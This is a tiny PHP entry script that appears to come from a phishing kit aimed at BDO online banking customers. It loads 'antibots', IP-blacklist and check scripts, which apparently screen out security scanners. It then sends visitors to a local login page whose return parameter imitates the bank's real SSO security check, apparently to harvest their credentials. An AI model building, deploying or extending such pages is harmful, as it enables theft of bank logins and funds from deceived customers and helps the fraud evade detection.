<?php
include("otobots/antibots.php");
include("otobots/ip_blacklist.php");
include("otobots/check.php");
header('Location:./login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check');

?>